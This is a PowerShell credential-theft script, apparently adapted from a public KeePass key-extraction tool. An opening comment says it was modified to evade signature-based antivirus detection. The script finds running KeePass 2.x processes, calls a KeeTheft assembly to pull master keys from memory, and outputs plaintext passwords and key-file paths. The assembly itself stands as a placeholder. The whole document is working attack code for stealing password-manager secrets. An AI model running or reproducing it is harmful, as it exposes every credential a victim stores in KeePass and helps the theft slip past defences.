# Changed the code to bypass signature based detection, credits to harmj0y for the code logic
#requires -version 2

function Get-KeePassDatabaseKey {

    [CmdletBinding()] 
    param (
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [System.Diagnostics.Process[]]
        [ValidateNotNullOrEmpty()]
        $TargetProcess
    )
    
    BEGIN {
        if(-not $PSBoundParameters['TargetProcess']) {
            try {
                $TargetProcess = Get-Process KeePass -ErrorAction Stop | Where-Object {$_.FileVersion -match '^2\.'}
            }
            catch {
                Write-Host 'No KeePass 2.X instances open!'
                return
            }
        }

        # load file off of disk instead
        # $KeePassAssembly = [Reflection.Assembly]::LoadFile((Get-Item -Path .\ReleaseKeePass.exe).FullName)

        # the KeyTheft assembly, generated with "Out-CompressedDll -FilePath .\ReleaseKeePass.exe | Out-File -Encoding ASCII .\compressed.ps1"

        <REPLACE>
    }

    PROCESS {

        ForEach($CurrentProcess in $TargetProcess) {

            if($CurrentProcess.FileVersion -match '^2\.') {

                $WMIProcess = Get-WmiObject win32_process -Filter "ProcessID = $($CurrentProcess.ID)"
                $ExecutablePath = $WMIProcess | Select-Object -Expand ExecutablePath

                Write-Host "Examining KeePass process $($CurrentProcess.ID) for master keys"

                $MasterKeys = $KeePassAssembly.GetType('KeeTheft.Program').GetMethod('GetKeePassMasterKeys').Invoke($null, @([System.Diagnostics.Process]$CurrentProcess))

                if($MasterKeys) {

                    ForEach ($MasterKey in $MasterKeys) {

                        ForEach($UserKey in $MasterKey.UserKeys) {

                            $KeyType = $UserKey.GetType().Name

                            $UserKeyObject = New-Object PSObject
                            $UserKeyObject | Add-Member Noteproperty 'Database' $UserKey.databaseLocation
                            $UserKeyObject | Add-Member Noteproperty 'KeyType' $KeyType
                            $UserKeyObject | Add-Member Noteproperty 'KeePassVersion' $CurrentProcess.FileVersion
                            $UserKeyObject | Add-Member Noteproperty 'ProcessID' $CurrentProcess.ID
                            $UserKeyObject | Add-Member Noteproperty 'ExecutablePath' $ExecutablePath
                            $UserKeyObject | Add-Member Noteproperty 'EncryptedBlobAddress' $UserKey.encryptedBlobAddress
                            $UserKeyObject | Add-Member Noteproperty 'EncryptedBlob' $UserKey.encryptedBlob
                            $UserKeyObject | Add-Member Noteproperty 'EncryptedBlobLen' $UserKey.encryptedBlobLen
                            $UserKeyObject | Add-Member Noteproperty 'PlaintextBlob' $UserKey.plaintextBlob

                            if($KeyType -eq 'KcpPassword') {
                                $Plaintext = [System.Text.Encoding]::UTF8.GetString($UserKey.plaintextBlob)
                            }
                            else {
                                $Plaintext = [Convert]::ToBase64String($UserKey.plaintextBlob)
                            }

                            $UserKeyObject | Add-Member Noteproperty 'Plaintext' $Plaintext

                            if($KeyType -eq 'KcpUserAccount') {
                                try {
                                    $WMIProcess = Get-WmiObject win32_process -Filter "ProcessID = $($CurrentProcess.ID)"
                                    $UserName = $WMIProcess.GetOwner().User

                                    $ProtectedUserKeyPath = Resolve-Path -Path "$($Env:WinDir | Split-Path -Qualifier)\Users\*$UserName*\AppData\Roaming\KeePass\ProtectedUserKey.bin" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path

                                    $UserKeyObject | Add-Member Noteproperty 'KeyFilePath' $ProtectedUserKeyPath

                                }
                                catch {
                                    Write-Host "Error enumerating the owner of $($CurrentProcess.ID) : $_"
                                }
                            }
                            else {
                                $UserKeyObject | Add-Member Noteproperty 'KeyFilePath' $UserKey.keyFilePath
                            }

                            $UserKeyObject.PSObject.TypeNames.Insert(0, 'KeePass.Keys')
                            $UserKeyObject

                            # Additional Write-Host statements for debugging purposes
                            Write-Host "User Key added for $($UserKey.databaseLocation)"
                        }
                    }
                }
                else {
                    Write-Host "No keys found for $($CurrentProcess.ID)"
                }
            }
            else {
                Write-Host "Only KeePass 2.X is supported at this time."
            }
        }
    }
}
